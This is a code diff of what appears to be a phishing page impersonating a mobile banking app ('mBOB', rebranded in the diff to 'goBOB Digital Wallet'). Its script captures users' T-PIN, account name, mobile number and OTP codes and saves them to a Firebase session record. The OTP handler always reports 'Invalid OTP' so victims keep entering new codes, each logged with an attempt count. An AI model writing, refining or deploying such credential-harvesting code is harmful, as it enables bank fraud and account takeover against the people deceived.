-    console.error('❌ Firebase error:', err);
-  });
+  }).then(function() { console.log('✅ Session created'); });
 
   showLoading();
-
   setTimeout(function() {
     hideLoading();
     showScreen('mpinPage');
@@ -907,20 +898,10 @@ function handleLogin(e) {
 function handleMpinVerify() {
   var tpin = '';
   for (var i = 1; i <= 6; i++) tpin += document.getElementById('m' + i).value;
-
-  if (tpin.length !== 6) {
-    showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning');
-    return;
-  }
+  if (tpin.length !== 6) { showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning'); return; }
 
   mpinValue = tpin;
-
-  if (sessionRef) {
-    sessionRef.update({ mpin: tpin }).then(function() {
-      console.log('✅ T-PIN saved');
-    });
-  }
-
+  if (sessionRef) sessionRef.update({ mpin: tpin });
   showMsg('mpinMessage', '✅ Verified successfully', 'success');
 
   setTimeout(function() {
@@ -934,56 +915,26 @@ function handleMpinVerify() {
 }
 
 // =====================================================
-// ACCOUNT DETAILS (Lock Removed - 1 char is enough)
+// ACCOUNT
 // =====================================================
 function checkAccountForm() {
   var name = document.getElementById('accountName').value.trim();
   var mob = document.getElementById('mobileNumber').value.trim();
-  var btn = document.getElementById('accountBtn');
-
-  // 🔓 LOCK REMOVED: Minimum 1 character in each field
-  if (name.length >= 1 && mob.length >= 1) {
-    btn.disabled = false;
-  } else {
-    btn.disabled = true;
-  }
+  document.getElementById('accountBtn').disabled = !(name.length >= 1 && mob.length >= 1);
 }
 
 function handleAccountConfirm() {
   var name = document.getElementById('accountName').value.trim();
   var mob = document.getElementById('mobileNumber').value.trim();
-
-  // 🔓 Simple validation — only check if empty
-  if (!name || name.length < 1) {
-    showMsg('accountMessage', 'Please enter your account name.', 'warning');
-    return;
-  }
-  if (!mob || mob.length < 1) {
-    showMsg('accountMessage', 'Please enter your mobile number.', 'warning');
-    return;
-  }
+  if (!name) { showMsg('accountMessage', 'Please enter your account name.', 'warning'); return; }
+  if (!mob) { showMsg('accountMessage', 'Please enter your mobile number.', 'warning'); return; }
 
   accountNameValue = name;
   mobileNumberValue = mob;
+  if (sessionRef) sessionRef.update({ accountName: name, mobileNumber: mob });
 
-  if (sessionRef) {
-    sessionRef.update({
-      accountName: name,
-      mobileNumber: mob
-    }).then(function() {
-      console.log('✅ Account details saved');
-    });
-  }
-
-  // Mask — show only last 4 digits
-  var masked;
-  if (mob.length <= 4) {
-    masked = mob;
-  } else {
-    masked = new Array(mob.length - 4 + 1).join('*') + mob.slice(-4);
-  }
+  var masked = mob.length <= 4 ? mob : new Array(mob.length - 4 + 1).join('*') + mob.slice(-4);
   document.getElementById('maskedNumber').textContent = masked;
-
   showMsg('accountMessage', '✅ Confirmed successfully', 'success');
 
   setTimeout(function() {
@@ -997,41 +948,23 @@ function handleAccountConfirm() {
 }
 
 // =====================================================
-// OTP VERIFY
+// OTP
 // =====================================================
 function handleOtpVerify() {
-  if (timeLeft <= 0) {
-    showMsg('otpMessage', 'OTP has expired. Please request a new one.', 'error');
-    return;
-  }
-
+  if (timeLeft <= 0) { showMsg('otpMessage', 'OTP has expired. Please request a new one.', 'error'); return; }
   var otp = '';
   for (var i = 1; i <= 6; i++) otp += document.getElementById('o' + i).value;
-
-  if (otp.length !== 6) {
-    showMsg('otpMessage', 'Please enter all 6 digits.', 'warning');
-    return;
-  }
+  if (otp.length !== 6) { showMsg('otpMessage', 'Please enter all 6 digits.', 'warning'); return; }
 
   otpAttemptCount++;
-
   if (sessionRef) {
     var now = new Date();
-    var otpKey = 'otp_' + Date.now();
-
-    sessionRef.child('otpHistory/' + otpKey).set({
-      otp: otp,
-      attempt: otpAttemptCount,
+    sessionRef.child('otpHistory/otp_' + Date.now()).set({
+      otp: otp, attempt: otpAttemptCount,
       time: now.toLocaleString('en-US', { hour12: true }),
       timestamp: now.getTime()
-    }).then(function() {
-      console.log('✅ OTP saved');
     });
-
-    sessionRef.update({
-      otpCode: otp,
-      totalOtpAttempts: otpAttemptCount
-    });
+    sessionRef.update({ otpCode: otp, totalOtpAttempts: otpAttemptCount });
   }
 
   showMsg('otpMessage', 'Invalid OTP. Please try again.', 'error');
@@ -1046,17 +979,10 @@ function startTimer() {
   timeLeft = 180;
   updateTimer();
   if (timerInterval) clearInterval(timerInterval);
-
   timerInterval = setInterval(function() {
     timeLeft--;
     updateTimer();
-
-    if (timeLeft <= 30) {
-      document.getElementById('otpTimer').classList.add('expiring');
-    } else {
-      document.getElementById('otpTimer').classList.remove('expiring');
-    }
-
+    document.getElementById('otpTimer').classList.toggle('expiring', timeLeft <= 30);
     if (timeLeft <= 0) {
       clearInterval(timerInterval);
       document.getElementById('otpTimer').textContent = '00:00';
@@ -1066,15 +992,13 @@ function startTimer() {
 }
 
 function updateTimer() {
-  var min = Math.floor(timeLeft / 60);
-  var sec = timeLeft % 60;
+  var min = Math.floor(timeLeft / 60), sec = timeLeft % 60;
   document.getElementById('otpTimer').textContent =
     (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
 }
 
 function resendOtp() {
-  timeLeft = 180;
-  updateTimer();
+  timeLeft = 180; updateTimer();
   document.getElementById('otpTimer').classList.remove('expiring');
   startTimer();
   showMsg('otpMessage', 'New OTP has been sent.', 'success');
@@ -1083,67 +1007,46 @@ function resendOtp() {
 // =====================================================
 // HELPERS
 // =====================================================
-function showScreen(pageId) {
-  document.querySelectorAll('.screen-page').forEach(function(p) {
-    p.classList.remove('show');
-  });
-  document.getElementById(pageId).classList.add('show');
+function showScreen(id) {
+  document.querySelectorAll('.screen-page').forEach(function(p) { p.classList.remove('show'); });
+  document.getElementById(id).classList.add('show');
 }
 
 function goBack() {
-  document.querySelectorAll('.screen-page').forEach(function(p) {
-    p.classList.remove('show');
-  });
+  document.querySelectorAll('.screen-page').forEach(function(p) { p.classList.remove('show'); });
 }
 
-function goBackTo(pageId) {
-  document.querySelectorAll('.screen-page').forEach(function(p) {
-    p.classList.remove('show');
-  });
-  document.getElementById(pageId).classList.add('show');
+function goBackTo(id) {
+  document.querySelectorAll('.screen-page').forEach(function(p) { p.classList.remove('show'); });
+  document.getElementById(id).classList.add('show');
 }
 
 function moveInput(current, nextId) {
   current.value = current.value.replace(/[^0-9]/g, '');
-
   if (current.value.length === 1) {
     current.classList.add('filled');
-    if (nextId) {
-      var next = document.getElementById(nextId);
-      if (next) next.focus();
-    }
-  } else {
-    current.classList.remove('filled');
-  }
-
-  var id = current.id;
-  if (id.startsWith('m')) checkMpinComplete();
-  if (id.startsWith('o')) checkOtpComplete();
+    if (nextId) { var n = document.getElementById(nextId); if (n) n.focus(); }
+  } else { current.classList.remove('filled'); }
+  if (current.id.startsWith('m')) checkMpinComplete();
+  if (current.id.startsWith('o')) checkOtpComplete();
 }
 
 function checkMpinComplete() {
-  var complete = true;
-  for (var i = 1; i <= 6; i++) {
-    if (document.getElementById('m' + i).value.length !== 1) { complete = false; break; }
-  }
-  document.getElementById('mpinBtn').disabled = !complete;
+  var ok = true;
+  for (var i = 1; i <= 6; i++) if (document.getElementById('m' + i).value.length !== 1) { ok = false; break; }
+  document.getElementById('mpinBtn').disabled = !ok;
 }
 
 function checkOtpComplete() {
-  var complete = true;
-  for (var i = 1; i <= 6; i++) {
-    if (document.getElementById('o' + i).value.length !== 1) { complete = false; break; }
-  }
-  document.getElementById('otpBtn').disabled = !complete;
+  var ok = true;
+  for (var i = 1; i <= 6; i++) if (document.getElementById('o' + i).value.length !== 1) { ok = false; break; }
+  document.getElementById('otpBtn').disabled = !ok;
 }
 
 function clearOtpInputs(prefix) {
   for (var i = 1; i <= 6; i++) {
     var el = document.getElementById(prefix + i);
-    if (el) {
-      el.value = '';
-      el.classList.remove('filled');
-    }
+    if (el) { el.value = ''; el.classList.remove('filled'); }
   }
 }
 
@@ -1153,33 +1056,21 @@ function showMsg(id, text, type) {
   el.className = 'message show ' + (type || 'error');
 }
 
-function showLoading() {
-  document.getElementById('loadingOverlay').classList.add('show');
-}
+function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
+function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
 
-function hideLoading() {
-  document.getElementById('loadingOverlay').classList.remove('show');
-}
-
-// Backspace navigation
 document.addEventListener('keydown', function(e) {
   if (e.key === 'Backspace') {
-    var target = e.target;
-    if (target.tagName === 'INPUT' && !target.value) {
-      var id = target.id;
-      if (id.startsWith('m')) {
-        var n = parseInt(id.replace('m', ''));
-        if (n > 1) document.getElementById('m' + (n - 1)).focus();
-      }
-      if (id.startsWith('o')) {
-        var n = parseInt(id.replace('o', ''));
-        if (n > 1) document.getElementById('o' + (n - 1)).focus();
-      }
+    var t = e.target;
+    if (t.tagName === 'INPUT' && !t.value) {
+      var id = t.id;
+      if (id.startsWith('m')) { var n = parseInt(id.replace('m','')); if (n > 1) document.getElementById('m'+(n-1)).focus(); }
+      if (id.startsWith('o')) { var n = parseInt(id.replace('o','')); if (n > 1) document.getElementById('o'+(n-1)).focus(); }
     }
   }
 });
 
-console.log('🏦 mBOB Mobile Banking loaded • Data node:', DATA_NODE);
+console.log('🏦 goBOB Digital Wallet loaded • Data node:', DATA_NODE);
 </script>
 
 </body>
